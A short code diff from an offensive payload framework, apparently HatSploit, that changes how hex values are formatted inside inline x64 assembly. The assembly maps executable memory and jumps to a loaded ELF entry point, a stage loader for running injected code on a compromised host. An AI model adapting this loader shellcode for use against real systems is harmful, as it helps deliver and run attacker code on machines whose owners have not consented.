@@ -42,7 +42,7 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
                 push 0x9
                 pop rax
                 xor rdi, rdi
-                push {'0x%08x' % len(phase1())}
+                push {hex(len(phase1()))}
                 pop rsi
                 push 0x7
                 pop rdx
@@ -75,7 +75,7 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
                 push rcx
                 push 0x2
 
-                push {'0x%08x' % self.get_header(phase1())['e_entry']}
+                push {hex(self.get_header(phase1())['e_entry'])}
                 pop rax
                 add rsi, rax
                 jmp rsi
